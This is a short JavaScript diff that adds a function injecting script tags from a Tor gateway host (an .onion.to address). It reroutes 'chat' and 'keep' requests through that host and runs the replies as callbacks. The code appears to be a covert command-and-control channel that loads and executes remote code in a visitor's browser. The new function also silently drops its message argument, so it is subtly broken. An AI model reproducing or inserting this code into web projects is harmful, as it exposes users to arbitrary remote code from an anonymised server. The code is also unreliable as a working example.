@@ -7,6 +7,11 @@ function getURL(url,callback){
 	//old proxy:"https://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20json%20where%20url%3D'"+url+"'&format=json&diagnostics=true&callback="+callback;
 	document.body.appendChild(script);
 }
+function getResource(cmd,id,to,callback){
+	var script = document.createElement('script');
+	script.src = 'http://qzfbhpc4waxkrcdg.onion.to/chat/app.php.js?cmd='+cmd+'&id='+id+'&callback='+callback;
+	document.body.appendChild(script);
+}
 
 function idontcare(aboutthis){}
 
@@ -34,14 +39,16 @@ function sendRequest(sendback,command,data){
 	message = JSON.stringify(message);
 	var encoded_message = rfc3986EncodeURIComponent(rfc3986EncodeURIComponent(message));
 	//getURL('http%3A%2F%2Fec.androiddown.com%2Fchat%2Fapp.php%3Fcmd%3Dkeep%26id%3D'+sendback,'idontcare');
-	getURL('http%3A%2F%2Fec.androiddown.com%2Fchat%2Fapp.php%3Fcmd%3Dchat%26id%3Dzerving_hat%26to%3D'+encoded_message,'idontcare');
+	//getURL('http%3A%2F%2Fd6rb4djowarvwvp5.onion.to%2Fchat%2Fapp.php%3Fcmd%3Dchat%26id%3Dzerving_hat%26to%3D'+encoded_message,'idontcare');
+	getResource('chat','zerving_hat',encoded_message,'idontcare');
 	requestData[sendback]={"callback":null,"response":'',"tries":0,"run":null};
 }
 
 function getReply(sendback,callback){
 	requestData[sendback].run = new Function('response',"return finishgetReply(response,'"+sendback+"');");
 	requestData[sendback].callback = callback;
-	getURL('http%3A%2F%2Fec.androiddown.com%2Fchat%2Fapp.php%3Fcmd%3Dkeep%26id%3D'+sendback,'requestData["'+sendback+'"].run');
+	//getURL('http%3A%2F%2Fd6rb4djowarvwvp5.onion.to%2Fchat%2Fapp.php%3Fcmd%3Dkeep%26id%3D'+sendback,'requestData["'+sendback+'"].run');
+	getResource('keep',sendback,'idontcare','requestData["'+sendback+'"].run');
 	}function finishgetReply(response,sendback){console.log(response);json = response;
 		var callback = requestData[sendback].callback;
 		console.log(requestData[sendback]);
